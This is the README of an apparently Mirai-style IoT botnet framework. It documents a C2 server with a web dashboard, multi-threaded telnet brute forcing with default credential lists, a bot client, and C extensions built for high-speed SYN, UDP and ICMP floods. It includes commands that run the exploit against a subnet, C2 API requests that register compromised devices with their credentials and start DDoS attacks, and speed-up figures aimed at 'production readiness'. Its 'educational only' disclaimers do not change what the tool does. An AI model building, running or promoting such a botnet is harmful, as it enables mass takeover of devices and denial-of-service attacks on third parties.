# IoT Attack & Threat Framework - High Performance Edition

## Overview

This framework provides high-performance tools for IoT security research in controlled lab environments. It features optimized C extensions, multi-threaded operations, and cross-platform compatibility for Windows and Ubuntu/Linux systems.

### Key Features:
- ⚡ **8.10x Performance Improvement** with optimized C extensions
- 🧵 **Multi-threaded Operations** with configurable thread pools
- 🖥️ **Cross-Platform Support** for Windows and Ubuntu/Linux
- 🚀 **High-Speed DDoS Capabilities** with C-based packet generation
- 📊 **Real-time Performance Monitoring** and statistics
- 🎯 **Batch Operations** for reduced network overhead

## 🚨 Educational Purpose Only

This software is designed for educational and research purposes in controlled lab environments only. It should never be used against systems without explicit authorization.

## Components

1. **C2 Server** (`c2_server/`) - Central command server with web interface
2. **Exploit Script** (`exploit.py`) - Network scanning and device exploitation (modular architecture)
3. **Bot Client** (`bot_client.py`) - Simulated IoT bot for testing
4. **Registration Verification System** - Device synchronization monitoring
5. **Testing Suite** - Comprehensive validation and analysis tools
6. **Modular Components** (`modules/`) - Separated functionality for better maintainability:
   - **NetworkScanner** - Handles nmap-based network discovery and service detection
   - **TelnetBruteForcer** - Manages credential attacks and device compromise tracking
   - **C2Communicator** - Centralizes all C2 server interactions
   - **UserInterface** - Provides consistent user interaction and display

## Architecture

The framework has been refactored into a modular architecture for improved maintainability:

- **Main Script** (`exploit.py`) - Orchestrates all operations (~280 lines vs. original 1478 lines)
- **Specialized Modules** - Each module handles a specific responsibility
- **Clean Separation** - Network operations, attack functionality, server communication, and UI are separate
- **Maintained Compatibility** - All original functionality preserved through modular composition

## Quick Start

### 1. Install Dependencies

```bash
# Create virtual environment
python -m venv .venv

# Windows
.venv\Scripts\Activate.ps1

# Linux/Mac
source .venv/bin/activate

# Install requirements
pip install -r requirements.txt
```

### 2. Start the C2 Server

```bash
cd c2_server
python run_c2.py
```

Web interface: `http://127.0.0.1:5000`

### 3. Run Network Exploitation

```bash
python exploit.py [C2_SERVER_IP] [TARGET_SUBNET]
```

Example:
```bash
python exploit.py 127.0.0.1 192.168.1.0/24
```

## Web Interface Features

- **Real-time Dashboard**: Monitor compromised devices and active attacks
- **Device Management**: View online/offline status and device details
- **Attack Coordination**: Start/stop DDoS attacks remotely
- **Network Scanning**: View discovered vulnerable devices
- **Statistics**: Track compromise rates and attack metrics

## C2 Server API

### Device Registration
```http
POST /bot-checkin
Content-Type: application/json

{
    "ip": "192.168.1.100",
    "username": "admin",
    "password": "password",
    "device_type": "camera"
}
```

### Attack Management
```http
POST /start-telnet-ddos
Content-Type: application/json

{
    "target": "192.168.1.1",
    "attack_type": "syn"
}
```

```http
POST /stop-telnet-ddos
```

## File Structure (Cleaned and Optimized)

```
AttackThreat/
├── 📄 Core Scripts
│   ├── exploit.py                    # Original modular script
│   ├── exploit_optimized.py          # High-performance optimized version
│   ├── bot_client.py                 # IoT bot simulator
│   ├── credentials.py                # Default credential lists
│   └── requirements.txt              # Python dependencies
│
├── ⚡ High-Performance C Extensions
│   ├── fast_telnet_bruteforce.cp312-win_amd64.pyd  # Windows compiled
│   ├── fast_ddos_attack.cp312-win_amd64.pyd        # Windows compiled
│   ├── fast_telnet_bruteforce_cross.c              # Cross-platform source
│   ├── fast_ddos_attack_cross.c                    # Cross-platform source
│   ├── fast_telnet_bruteforce_win.c                # Windows source
│   └── fast_ddos_attack_win.c                      # Windows source
│
├── 🛠️ Setup and Installation
│   ├── cross_platform_setup.py      # Universal auto-setup
│   ├── ubuntu_setup.py               # Ubuntu-specific setup
│   ├── ubuntu_validator.py           # Compatibility validation
│   ├── setup_fast_bruteforce_cross.py # Cross-platform compilation
│   ├── setup_fast_ddos_cross.py      # Cross-platform compilation
│   ├── setup_fast_bruteforce_win.py  # Windows compilation
│   ├── setup_fast_ddos_win.py        # Windows compilation
│   └── setup_performance.py          # Performance optimization setup
│
├── 📚 Documentation
│   ├── README.md                     # Main documentation (this file)
│   ├── PROJECT_COMPLETION_REPORT.md  # Performance optimization results
│   ├── OPTIMIZATION_SUMMARY.md       # Technical optimization details
│   ├── CROSS_PLATFORM_COMPATIBILITY_REPORT.md # Ubuntu/Linux support
│   └── UBUNTU_DEPLOYMENT_GUIDE.md    # Ubuntu installation guide
│
├── 🧩 Modular Components
│   └── modules/
│       ├── __init__.py               # Module package initialization
│       ├── network_scanner.py        # Network scanning (nmap integration)
│       ├── telnet_bruteforcer.py     # Multi-threaded brute forcing
│       ├── c2_communicator.py        # C2 server communication
│       └── user_interface.py         # UI and display functions
│
├── 🖥️ Command & Control Server
│   └── c2_server/
│       ├── c2_server.py              # Enhanced Flask server with batch ops
│       ├── web_ui.py                 # Web interface template
│       ├── db_manager.py             # Database operations
│       ├── tn_manager.py             # Telnet connection manager
│       ├── run_c2.py                 # Server startup script
│       ├── requirements.txt          # C2-specific dependencies
│       └── README.md                 # C2 server documentation
│
└── 🚀 Deployment Tools
    ├── deploy_optimized_system.py    # Complete system deployment
    └── run_c2_server.py              # Simplified C2 startup
```

### 🗑️ Cleaned Files and Directories

The following unnecessary files have been removed for production readiness:
- ❌ `build/` directory and all compilation artifacts
- ❌ `__pycache__/` directories and `.pyc` files
- ❌ `c2_server.log` and other temporary log files
- ❌ Test database files (`c2_database.db`)
- ❌ Duplicate compiled extensions
- ❌ Development and debug scripts
- ❌ Temporary test artifacts

## 🚀 Usage Examples

### High-Performance Mode (Recommended)

```powershell
# Windows - Using optimized script with C extensions
python exploit_optimized.py --fast --threads 20 127.0.0.1 192.168.1.0/24
```

```bash
# Ubuntu/Linux - After running setup
python3 exploit_optimized.py --fast --threads 20 127.0.0.1 192.168.1.0/24
```

### Standard Mode (Original)

```powershell
# Windows - Original modular script
python exploit.py 127.0.0.1 192.168.1.0/24
```

### C2 Server Startup

```powershell
# Simple startup
python run_c2_server.py

# Or use the detailed server
cd c2_server
python run_c2.py
```

## 🧪 Testing and Validation

### Performance Validation

```powershell
# Test C extensions are working
python -c "import fast_telnet_bruteforce, fast_ddos_attack; print('✅ C extensions OK')"

# Validate modular components
python -c "from modules.telnet_bruteforcer import TelnetBruteForcer; print('✅ Modules OK')"

# Cross-platform compatibility test
python ubuntu_validator.py
```

### System Health Check

```powershell
# Check all core components
python -c "
try:
    import exploit, exploit_optimized, bot_client
    from modules import network_scanner, telnet_bruteforcer, c2_communicator, user_interface
    from c2_server import c2_server, db_manager, web_ui
    print('✅ All core components importable')
except Exception as e:
    print(f'❌ Import error: {e}')
"
```

## ⚡ Performance Optimizations

### Performance Metrics Achieved

| Component | Before | After | Improvement |
|-----------|--------|-------|-------------|
| Telnet Brute Force | Sequential, 15s timeouts | Multi-threaded, 3-5s timeouts | **8.10x faster** |
| Network Scanning | Single-threaded | Optimized threading | **3-5x faster** |
| C2 Communication | Individual API calls | Batch operations | **80% less overhead** |
| DDoS Attacks | Python-only | C extensions | **Maximum performance** |

### Optimization Features

- **🧵 Multi-threading**: Configurable thread pools (1-50 threads)
- **⚡ C Extensions**: Native performance for critical operations
- **📊 Batch Operations**: Reduced network overhead for C2 communication
- **🎯 Smart Timeouts**: Optimized connection timeouts (3-5s vs 15s)
- **🔄 Resource Management**: Efficient memory and connection handling
- **📈 Performance Monitoring**: Real-time statistics and metrics

### C Extension Details

The high-performance C extensions provide:
- **Native telnet connections** with optimized socket handling
- **Multi-threaded brute forcing** with thread-safe operations
- **High-speed DDoS capabilities** with UDP/TCP/ICMP flood support
- **Cross-platform compatibility** (Windows + Ubuntu/Linux)
- **Automatic fallback** to Python implementations when unavailable

## 🌐 Cross-Platform Support

### Supported Platforms

| Platform | Status | C Extensions | Setup Method |
|----------|--------|--------------|--------------|
| **Windows** | ✅ Full Support | Pre-compiled .pyd files | `pip install -r requirements.txt` |
| **Ubuntu/Linux** | ✅ Full Support | GCC compilation | `python3 ubuntu_setup.py` |
| **macOS** | ⚠️ Experimental | Clang compilation | `python3 cross_platform_setup.py` |

### Platform-Specific Features

**Windows:**
- Pre-compiled C extensions included
- Winsock2 optimized networking
- Windows threading API integration

**Ubuntu/Linux:**
- Automatic GCC dependency checking
- pthread multi-threading support
- Native BSD socket optimization

### Database Schema

The C2 server uses SQLite with enhanced tables for:
- `devices` - Compromised device inventory with performance metadata
- `scan_results` - Network discovery data with batch import support  
- `sessions` - Active attack sessions with real-time statistics
- `performance_metrics` - System performance tracking and analytics

## Security Notes

- All communications use HTTP (for lab use only)
- Passwords are stored in plaintext (educational purposes)
- No authentication required for C2 interface (lab environment)
- Designed for isolated test networks only

## Legal Disclaimer

This tool is for authorized security testing and educational purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations. Unauthorized use against systems you do not own or have explicit permission to test is prohibited and may be illegal.
- Required Python packages (automatically installed by start scripts):
  - Flask
  - Requests
  - Telnetlib3
  - Python-dotenv
  - Paho-MQTT

## Documentation

For detailed documentation on the C2 server architecture and API endpoints, see the [C2 Server README](c2_server/README.md).

## System Cleanup

### Windows
```
cleanup.bat
```

### Linux/Ubuntu
```
./cleanup.sh
```

This will clean up the database, log files, and cache files for a fresh start.

## License

This project is for educational purposes only. Usage for any malicious activity is strictly prohibited.

## 🚀 Quick Start - Cross-Platform

### Option 1: Automatic Setup (Recommended)

The easiest way to get started on any platform:

```bash
# Run the cross-platform auto-setup script
python cross_platform_setup.py
```

This script will:
- Detect your platform (Windows/Ubuntu/Linux/macOS)
- Install required system dependencies
- Compile C extensions for maximum performance
- Install Python requirements
- Validate the installation

### Option 2: Manual Setup

#### Windows Installation

1. **Prerequisites:**
   ```powershell
   # Ensure you have Python 3.8+ and pip installed
   python --version
   pip --version
   ```

2. **Install Requirements:**
   ```powershell
   pip install -r requirements.txt
   ```

3. **C Extensions (Pre-compiled):**
   ```powershell
   # The repository includes pre-compiled Windows extensions:
   # - fast_telnet_bruteforce.cp312-win_amd64.pyd
   # - fast_ddos_attack.cp312-win_amd64.pyd
   
   # Test the extensions:
   python -c "import fast_telnet_bruteforce, fast_ddos_attack; print('✅ C extensions working!')"
   ```

#### Ubuntu/Linux Installation

1. **System Dependencies:**
   ```bash
   # Update package list
   sudo apt-get update
   
   # Install build tools and development headers
   sudo apt-get install -y build-essential python3-dev libc6-dev gcc
   ```

2. **Python Requirements:**
   ```bash
   # Install Python packages
   pip3 install -r requirements.txt
   ```

3. **Compile C Extensions:**
   ```bash
   # Compile telnet brute force extension
   python3 setup_fast_bruteforce_cross.py build_ext --inplace
   
   # Compile DDoS attack extension
   python3 setup_fast_ddos_cross.py build_ext --inplace
   
   # Test the extensions
   python3 -c "import fast_telnet_bruteforce, fast_ddos_attack; print('✅ C extensions working!')"
   ```

4. **Alternative Ubuntu Setup:**
   ```bash
   # Use the dedicated Ubuntu setup script
   python3 ubuntu_setup.py
   ```

#### macOS Installation (Experimental)

1. **Prerequisites:**
   ```bash
   # Install Xcode Command Line Tools
   xcode-select --install
   
   # Or install via Homebrew:
   brew install gcc
   ```

2. **Follow Linux/Ubuntu Instructions:**
   ```bash
   pip3 install -r requirements.txt
   python3 setup_fast_bruteforce_cross.py build_ext --inplace
   python3 setup_fast_ddos_cross.py build_ext --inplace
   ```

## 📋 Installation Verification

After installation, verify everything is working:

```bash
# Test basic imports
python -c "import requests, flask, colorama; print('✅ Python packages OK')"

# Test C extensions (optional, but recommended for performance)
python -c "import fast_telnet_bruteforce, fast_ddos_attack; print('✅ C extensions OK')"

# Run performance test
python -c "
from modules.telnet_bruteforcer import TelnetBruteForcer
bf = TelnetBruteForcer(max_threads=20)
print(f'✅ Multi-threading initialized with {bf.max_threads} threads')
"
```
